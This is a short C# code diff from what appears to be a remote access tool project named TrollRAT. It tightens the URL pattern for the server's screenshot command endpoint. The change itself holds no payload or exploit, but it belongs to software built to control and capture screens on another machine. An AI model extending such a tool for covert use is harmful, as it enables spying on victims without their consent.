@@ -10,7 +10,7 @@ namespace TrollRAT.Server.Commands
 {
     public class ScreenshotCommand : WebServerCommandBase
     {
-        public override Regex Path => new Regex("/screenshot(\\.png)?");
+        public override Regex Path => new Regex("^/screenshot(\\.png)?$");
 
         public override void execute(HttpListenerContext context)
         {
